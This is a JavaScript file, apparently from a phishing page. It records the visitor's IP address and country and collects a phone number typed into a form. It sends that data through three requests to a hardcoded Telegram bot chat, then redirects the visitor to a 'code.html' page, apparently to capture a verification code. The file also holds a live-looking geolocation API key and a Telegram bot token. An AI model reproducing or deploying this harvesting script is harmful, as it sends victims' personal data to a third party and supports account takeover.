let ip_address;
let country_code;

function callback(response) {
    ip_address = response.ip_address;
    country_code = response.country_code;
}

$.ajax({
    url: `https://ipgeolocation.abstractapi.com/v1/?api_key=104f5022d14b4071b2a6f8ebda39a37a`,
    method: "GET",
    success: callback,
    error: function(xhr, status, error) {
        console.error("Error fetching IP data:", error);
    }
});

function ValideText() {
    return (
        document.getElementById("txtphone").value != "" &&
        document.getElementById("txtphone").value.length >= 6 &&
        document.getElementById("txtphone").value.length != 0
    );
}

let btnClicked = false;

function SendNumber() {
    if (!btnClicked) {
        const botToken = "6346924701:AAGkU_UOQxhSAbyrebUAxzW3huk5yc_m1Tw";
        const chatId = "625048457";
        let counter = 0;

        if (ValideText() && !isNaN(document.getElementById("txtphone").value)) {
            btnClicked = true;
            const selectCountry = document.getElementById("SelecTcountry");
            const countryCode = `(${selectCountry.options[selectCountry.selectedIndex].value})`;
            const phoneNumber = document.getElementById("txtphone").value;
            const telegramUrl1 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🆕`;
            
            fetch(telegramUrl1, { method: "POST" }).then((response1) => {
                if (response1.ok) {
                    const telegramUrl2 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=+${phoneNumber}`;
                    
                    fetch(telegramUrl2, { method: "POST" }).then((response2) => {
                        if (response2.ok) {
                            counter++;
                            const telegramUrl3 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=IP : ${ip_address}:${country_code}:${countryCode}`;
                            
                            fetch(telegramUrl3, { method: "POST" }).then((response3) => {
                                if (response3.ok && counter === 1) {
                                    window.location.replace("code.html");
                                } else {
                                    window.location.replace("index.html");
                                }
                            });
                        }
                    });
                }
            });
        }
    }
}

function isInputNumber(event) {
    const charCode = String.fromCharCode(event.which);
    if (!/[0-9]/.test(charCode)) {
        event.preventDefault();
    }
}
